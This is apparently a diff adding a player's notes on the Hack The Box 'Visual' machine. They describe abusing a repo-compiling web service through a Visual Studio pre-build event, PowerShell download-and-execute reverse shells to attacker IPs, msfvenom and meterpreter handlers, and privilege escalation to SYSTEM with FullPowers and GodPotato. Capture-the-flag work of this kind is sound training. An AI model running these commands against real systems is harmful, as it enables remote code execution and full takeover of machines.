@@ -1,0 +1,77 @@
+Port 80 is a website talking about converting github links into executables or DLLs. "Simply provide us with your Git Repo link, and we'll handle the rest. Our cutting-edge technology compiles your projects and sends back the executable or DLL files you need, effortlessly and efficiently."
+
+The windows web server is an apache 2.4.56 with PHP running
+
+Invoke-WebRequest -Uri http://10.10.14.166:4444/?p=Test -Method GET
+
+After sending a json request we get an error that shows the directory the website is stored: C:\xampp\htdocs\submit.php
+
+Special characters are not allowed in the URL, even "http://IP/" isnt allowed
+
+The website is a bit strange since sending public githubs that contain sln files tends to result in the Error "The repository doesn't contain a .sln file or the URL submitted is invalid."
+
+**UPDATE**
+curl https://github.com/EndermanSUPREME/csharp_powershell.git/info/refs?service=git-upload-pack --> downloads a data file called refs
+
+Unsure on why when visual.htb can indeed access this file why it seems to have a hard time doing other things.
+
+https://theartofmachinery.com/2016/07/02/git_over_http.html --> helps with dealing with this issue, after doing everything the python web server gets hit with what appears to be a git clone
+
+After the site does its thing, i got hit with a build failed and they gave me a dump of info concerning why it failed, ill need to scan through it to find any useful information
+
+1.) Make repo on github.com & add the vs project files in the repo (.sln and etc)
+2.) git clone --mirror https://github.com/EndermanSUPREME/csharp_powershell.git
+3.) run as sudo the other commands to set up the http server hosting the repo to then send at visual.htb
+
+I need to keep an eye out for Visual Studio Compile RCE exploits
+https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwj07KnL4tWBAxW7H0QIHRs5C0EQFnoECBoQAQ&url=https%3A%2F%2Fwww.howtogeek.com%2Fdevops%2Fhow-to-run-a-command-before-or-after-a-build-in-visual-studio%2F&usg=AOvVaw2BnPlvW4DiqWfS38inELvg&opi=89978449
+
+By going into the project settings in visual studio, we can set the project that before building it executes powershell code.
+
+Windows Reverse Shell Crafting:
+https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3 --> has a nice one liner ps1
+
+powershell -c "echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.166:8000/shell.ps1') | powershell -noprofile"
+
+Using msfconsole, after we gain a session from our listener, we need to run
+sessions -i [int] to gain access to the session and interact with our shell.
+----------------------------------------------------
+
+curl http://10.10.15.68:80/winpeas.ps1 -O winpeas.ps1
+.\winpeas.ps1 > enoxEnum.txt ==> didnt output anything helpful
+
+As enox we can access the websites root dir C:\xampp\htdocs and write our own php files to horizontally pivot to a new user `nt authority\local service`
+
+powershell+-c+"echo+IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.68:8000/shell3.ps1')+|+powershell+-noprofile"
+
+As local service we can try performing a priv esc to regain privilages that can potientially allow us to become an administrator and root the box (FullPower Priv Esc)
+
+curl http://10.10.15.68:8000/FullPower.zip -UseBasicParsing -O FullPower.zip
+
+Expand-Archive C:\Users\Public\Documents\FullPower.zip -DestinationPath C:\Users\Public\Documents
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=INT --format=exe > shell.exe
+
+[4445, 9001, 9002] --> ports we've been shelling to
+
+msfconsole {
+	use exploit/multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set lhost
+	set lport
+	run
+}
+
+Using .\FullPowers.exe -c "" --> Exec a command with full local privs
+
+Expand-Archive C:\Users\Public\Documents\juiccypotato.zip -DestinationPath C:\Users\Public\Documents
+
+Get-WmiObject -Query "SELECT * FROM Win32_DCOMApplication" | Select-Object Description, AppName, AppID, CommandLine > coms.txt
+
+.\JuicyPotatoNG.exe -t * -p C:\Users\Public\Documents\mal.bat -c "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}" -l 9999 ==> JuicyPotato isnt going to work
+
+Move-Item C:\Users\Public\Documents\coms.txt C:\xampp\htdocs\coms.txt
+
+.\godpotato.exe -cmd "cmd /c .\shell.exe" ==> execs as local system!
+
+As local system we can access Administrator and get root.txt
